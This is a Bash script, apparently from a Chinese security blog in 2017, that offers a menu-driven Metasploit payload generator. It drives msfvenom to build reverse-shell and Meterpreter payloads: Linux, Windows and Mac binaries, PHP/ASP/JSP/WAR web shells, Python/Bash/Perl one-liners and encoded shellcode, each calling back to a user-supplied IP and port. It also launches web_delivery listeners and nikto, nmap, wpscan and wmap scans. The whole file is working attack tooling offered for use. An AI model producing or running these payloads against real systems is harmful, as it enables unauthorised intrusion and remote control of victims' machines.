#！ /bin/bash
LANG=zh_CN.UTF-8
echo    "                                  _     _   ";
echo    "                    ___  ___  ___(_)___| |_ ";
echo    "                   / __|/ _ \/ __| / __| __|";
echo    "                   \__ \  __/ (__| \__ \ |_ ";
echo    "                   |___/\___|\___|_|___/\__|";


echo -e "/==========================########========================\\"
echo -e "|                             # v1.3                       |"
echo -e "|               #Demon博客www.ggsec.cn#                    |"
echo -e "|               #Metasploit Payload Generator#             |"
echo -e "|               #自动化简单小脚本          #               |"
echo -e "|               ##即刻安全博客 www.secist.com              |"
echo -e "|———————————#—————————————————#——————————————————#—————————|"
echo -e "|                                            墨    2017    |"
echo -e "\==========================================================/"
echo -e "|               @墨###即刻安全                             |"
echo -e "|               @emali###317718435@qq.com                  |"
echo -e "\==========================================================/"
echo "   "
sleep 1
echo "   "
# check msfconsole
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfconsole='1'
else
msfconsole='0'
fi
# check msfvenom
which msfvenom > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
msfvenom='1'
else
msfvenom='0'
fi
# check nmap
which nmap > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
nmap='1'
else
nmap='0'
fi
# check wpscan
which wpscan > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
wpscan='1'
else
wpscan='0'
fi
# check nikto
which nikto > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
nikto='1'
else
nikto='0'
fi
echo -n Check script  = =;
sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done
if [ "$msfconsole" == "1" ] && [ "$msfvenom" == "1" ]  && [ "$nmap" == "1" ] && [ "$nikto" == "1" ] && [ "$wpscan" == "1" ];then
echo -en 【已找到】
echo ""
echo ""
echo -e 'msfconsole    【已找到】'
echo -e 'msfvenom      【已找到】'
echo -e 'nmap          【已找到】'
echo -e 'nikto         【已找到】'
echo -e 'wpscan        【已找到】'
echo ""
sleep 2
fi
if [ "$msfconsole" == "0" ] || [ "$msfvenom" == "0" ] || [ "$nmap" == "0" ] [ "$nikto" == "0" ] || [ "$wpscan" == "0" ]; then
fail='1'
echo -en "\b \e[0;31m【Fail】\e[0m"
echo ""
echo ""
fi
if [ "$msfconsole" == "0" ] ;then
echo -e 'msfconsole    \e[0;31m【!!】 Not Found, first must be installed metasploit\e[0m';
fi
if [ "$msfvenom" == "0" ] ;then
echo -e 'msfvenom      \e[0;31m【!!】 Not Found, first must be install metasploit\e[0m';
fi
if [ "$nmap" == "0" ] ;then
echo -e 'nmap          \e[0;31m【!!】 Not Found, first must be install nmap\e[0m';
fi
if [ "$nikto" == "0" ] ;then
echo -e 'nikto         \e[0;31m【!!】 Not Found, first must be install nikto\e[0m';
fi
if [ "$wpscan" == "0" ] ;then
echo -e 'wpscan        \e[0;31m【!!】 Not Found, first must be install wpscan\e[0m';
fi
echo "[1] web_delivery(php)	      | [11] Scripting Payloads(Python)"
echo "[2] web_delivery(python)      | [12] Scripting Payloads(Bash)"
echo "[3] web_delivery(powershell)  | [13] Scripting Payloads(Perl)"
echo "------------------------------|-----------------------------------------"
echo "[4] Binaries(Linux)           | [14] ShellCode(Linux Based Shellcode)"
echo "[5] Binaries(windows)         | [15] Shellcode(Windows Based Shellcode)"
echo "[6] Binaries(Mac)             | [16] Shellcode(Mac Based Shellcode)" 
echo "------------------------------|-----------------------------------------"
echo "[7] Web Payloads(php)         | [17] Nikto(扫描一个站点)"
echo "[8] web Payloads(asp)         | [18] nmap(全面扫描)"
echo "[9] web Payloads(jsp)         | [19] Wpscan(扫描wp)"
echo "[10] web Payloads(war)        | [20] Wmap(扫描一个站点)"
echo " "
echo -e "请选择你的payload: \c"
read number
if [ "$number" == "1" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "2" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "3" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "4" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "5" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "6" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "7" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "8" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "9" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "10" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "11" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "12" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "13" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
fi
if [ "$number" == "14" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
echo -e "请输入你所要生成的语言: \c"
read language
echo -e "请输入编码次数: \c"
read ci
fi
if [ "$number" == "15" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
echo -e "请输入你所要生成的语言: \c"
read language
echo -e "请输入编码次数: \c"
read ci
fi
if [ "$number" == "16" ]; then
echo -e "请输入你的ip地址: \c"
read ip
echo -e "请输入你的端口: \c"
read port
echo -e "请输入你所要生成的语言: \c"
read language
echo -e "请输入编码次数: \c"
read ci
fi
if [ "$number" == "17" ]; then
echo -e "请输入你要扫描的站点: \c"
read www
fi
if [ "$number" == "18" ]; then
echo -e "请输入你的ip(网站)地址: \c"
read www
fi
if [ "$number" == "19" ]; then
echo -e "请输入你的ip(网站)地址: \c"
read www
fi
if [ "$number" == "20" ]; then
echo -e "请输入你的ip(网站)地址: \c"
read www
fi
case $number in
  1)
  echo "   "
  echo "use exploit/multi/script/web_delivery" >> powershell.rc
  echo "set PAYLOAD php/meterpreter/reverse_tcp" >> powershell.rc
  echo "set TARGET 1" >> powershell.rc
  echo "set LHOST $ip" >> powershell.rc
  echo "set LPORT $port" >> powershell.rc
  echo "set URIPATH /" >> powershell.rc
  echo "run" >> powershell.rc
  msfconsole -r powershell.rc
  rm  powershell.rc
  ;;
  2)
  echo "   "
  echo "use exploit/multi/script/web_delivery" >> powershell.rc
  echo "set LHOST $ip" >> powershell.rc
  echo "set LPORT $port" >> powershell.rc
  echo "set URIPATH /" >> powershell.rc
  echo "run" >> powershell.rc
  msfconsole -r powershell.rc
  rm  powershell.rc
  ;;
  3)
  echo "   "
  echo "use exploit/multi/script/web_delivery" >> powershell.rc
  echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> powershell.rc
  echo "set TARGET 2" >> powershell.rc
  echo "set LHOST $ip" >> powershell.rc
  echo "set LPORT $port" >> powershell.rc
  echo "set URIPATH /" >> powershell.rc
  echo "run" >> powershell.rc
  msfconsole -r powershell.rc
  rm  powershell.rc
  ;;
  4)
  echo "   "
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > shell.elf
  ;;
  5)
  echo "   "
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
  ;;
  6)
  echo "   "
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > shell.macho
  ;;
  7)
  echo "   "
  msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.php
  cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
  ;;
  8)
  echo "   "
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > shell.asp
  ;;
  9)
  echo "   "
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > shell.jsp
  ;;
  10)
  echo "   "
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > shell.war
  ;;
  11)
  echo "   "
  msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > shell.py
  ;;
  12)
  echo "   "
  msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > shell.sh
  ;;
  13)
  echo "   "
  msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -f raw > shell.pl
  ;;
  14)
  echo "   "
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
  ;;
  15)
  echo "   "
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
  ;;
  16)
  echo "   "
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -i $ci -f $language
  ;;
  17)
  echo "   "
  nikto -host $www
  ;;
  18)
  echo "   "
  nmap -A $www
  ;;
  19)
  echo "   "
  wpscan --url $www
  ;;
  20)
  echo "   "
  echo "load wmap" >> wmap.rc
  echo "wmap_sites -a http://$www" >> wmap.rc
  echo "wmap_sites -l" >> wmap.rc
  echo "wmap_targets -D 0" >> wmap.rc
  echo "wmap_targets -L" >> wmap.rc
  echo "wmap_run -t" >> wmap.rc
  echo "wmap_run -e" >> wmap.rc
  echo "vulns" >> wmap.rc
  msfconsole -r wmap.rc
  rm  wmap.rc
esac